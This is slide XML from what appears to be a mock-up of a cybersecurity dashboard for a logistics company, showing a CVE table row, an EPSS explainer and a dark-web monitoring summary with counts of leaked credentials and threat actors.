            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12.1%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="TextBox 103"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898648" y="5285232"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="TextBox 104"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="5285232"/>
            <a:ext cx="1691640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1046</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="TextBox 105"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5184648" y="5285232"/>
            <a:ext cx="4800600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prometheus /metrics endpoint unauthenticated — internal service discovery</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="107" name="TextBox 106"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10076688" y="5285232"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prometheus 2.4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="Rectangle 107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5532120"/>
            <a:ext cx="11731752" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="191303"/>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65760" y="5623560"/>
            <a:ext cx="11457432" cy="393192"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EPSS EXPLAINED: The EPSS (Exploit Prediction Scoring System) by FIRST.org uses a machine learning model trained on historical exploitation data, threat actor activity, and vulnerability characteristics to predict the probability a CVE will be exploited in the wild in the next 30 days. A score of 97.5% (CVE-2021-44228) means 97.5 out of 100 similar vulnerabilities were exploited. Use EPSS alongside CVSS — a low CVSS score with high EPSS (e.g. CVSS 7.5, EPSS 63%) should still be treated as critical priority.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="TextBox 109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6144768"/>
            <a:ext cx="11731752" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Drill-down: clicking any CVE opens the detail page with full CVSS vector string, CWE classification, NVD reference links, vendor advisory, MITRE technique descriptions, and the Sentinel AI patch recommendation.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Dark Web Monitor</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Credential leaks · Customer PII for sale · Ransomware claims · Threat actors · Exploit listings</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Dark Web Monitor continuously scours dark web marketplaces (BreachForums, Breached.vc, RansomHub leak sites), paste sites (Pastebin, PrivateBin), Telegram channels, and exploitation forums (XSS.is, 0day.today) for any mention of GlobalShip Logistics. Findings are automatically categorised as: Credential Leak (employee email/password pairs), Data Exposure (customer PII listings), Threat Actor (organised groups targeting the org), Exploit Sale (zero-day listings for technologies in the stack), or Brand Abuse (phishing domains, impersonation). Each finding is assigned a severity, status, and required action. Critical findings trigger immediate Slack/PagerDuty notifications.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2148840"/>
            <a:ext cx="228600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40280"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Total Findings</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2423160"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Active monitoring</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="2148840"/>
            <a:ext cx="228600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604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240280"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Critical Findings</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="2423160"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Immediate action</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4983480" y="2148840"/>
            <a:ext cx="228600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3208" y="2240280"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Employee Creds Leaked</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="2423160"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1,247</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>On Breached.vc</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7360920" y="2148840"/>
            <a:ext cx="228600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2148840"/>
            <a:ext cx="228600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2240280"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PII Records For Sale</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7470648" y="2423160"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12,000</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7470648" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BreachForums listing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9738360" y="2148840"/>
            <a:ext cx="219456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38360" y="2148840"/>
            <a:ext cx="219456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48088" y="2240280"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Active Threat Actors</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9848088" y="2423160"/>
            <a:ext cx="1975104" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9848088" y="2679192"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>APT29 · RansomHub</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="299008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26664"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Dark Web Findings — All Categories</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3264408"/>
            <a:ext cx="1202436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10128"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ID</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="886968" y="3310128"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CATEGORY</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1984248" y="3310128"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SEV</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="3310128"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STATUS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3675888" y="3310128"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SOURCE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="3310128"/>
            <a:ext cx="3703320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DESCRIPTION</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8567928" y="3310128"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AFFECTED DATA</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="TextBox 43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9893808" y="3310128"/>
            <a:ext cx="2331720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ACTION REQUIRED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Rectangle 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3520440"/>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2608" y="3557016"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dw-003</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="886968" y="3557016"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Data Exposure</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="TextBox 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1984248" y="3557016"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
